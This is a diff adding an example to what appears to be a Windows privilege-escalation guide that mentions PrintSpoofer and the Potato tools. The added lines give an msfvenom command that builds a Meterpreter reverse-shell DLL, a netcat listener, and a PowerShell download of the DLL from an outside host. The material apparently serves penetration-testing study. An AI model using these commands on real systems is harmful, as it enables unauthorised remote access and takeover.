@@ -1196,3 +1196,16 @@ nt authority\system
 ```
 
 PrintSpoofer was an easy exploit. There are also tools like variants from the [Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc) family (RottenPotato, SweetPotato, JuicyPotato) that are an effective alternative to PrintSpoofer.
+
+Additional Example:
+
+Get a reverse shell via a process dll to elevate privileges:
+
+```console
+
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp -ax64 -f dll lhost=222.222.222.222 lport=8888 -o EnterpriseServiceOptional.dll
+
+$ nc -nlvp 8888
+
+> iwr -uri http://192.168.45.245/EnterpriseServiceOptional.dll -Outfile EnterpriseServiceOptional.dll
+```
